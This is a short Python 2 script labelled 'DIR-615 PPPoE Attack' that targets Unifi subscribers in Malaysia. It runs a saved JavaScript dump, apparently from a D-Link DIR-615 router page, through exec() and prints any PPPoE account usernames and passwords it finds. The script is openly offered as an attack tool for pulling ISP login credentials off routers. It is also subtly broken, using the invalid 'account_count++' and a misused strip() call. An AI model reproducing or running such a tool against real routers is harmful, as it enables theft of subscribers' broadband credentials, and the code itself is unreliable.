#!/usr/bin/python

with open ("dir615_atk_js", "r") as infile:
    data=infile.read().replace('\n', '').replace('\t', '')

unifi_pppoe_raw = data.strip("var ")

account_count=0

exec(unifi_pppoe_raw)

print "****************************"
print "*      Unifi @ Malaysia	  *"
print "*    DIR-615 PPPoE Attack  *"
print "*         @wcypierre       *"
print "****************************"

for unifi_pppoe in WPPOE_list:
	if (unifi_pppoe[3] != 'user') and (unifi_pppoe[3] != 'username@hsbb'):
		print "[Account Found]"
		print "Username: " + unifi_pppoe[3]
		print "Password: " + unifi_pppoe[4]
		print ""
		account_count++

if account_count == 0:
	print "No Accounts has been found"
	
